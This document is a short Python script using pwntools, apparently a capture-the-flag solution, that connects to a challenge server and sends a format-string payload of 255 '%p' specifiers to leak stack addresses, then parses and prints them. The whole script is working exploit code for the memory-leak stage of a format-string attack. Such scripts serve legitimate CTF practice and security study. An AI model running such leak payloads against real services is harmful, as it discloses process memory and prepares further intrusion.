#!/usr/bin/env python3

from pwn import *
import re

with remote('ctfq.u1tramarine.blue', 10023) as p:
    p.recvuntil(b'?\n')
    
    finder = ('%p '*255)
    finder += '\n'
    p.send(finder.encode('UTF-8'))
    addr = p.recvline()
    addrs = re.findall(r'0x\w+', str(addr))
    
    if len(addrs) < 2:
        print('[!] Error : Failed to obtain address...\n')
        p.close()
        exit(0)
    
    addr_dict = {}
    for i, c in enumerate(addrs):
        if c not in addr_dict.values():
            addr_dict[i] = c
    
    print(addr_dict)
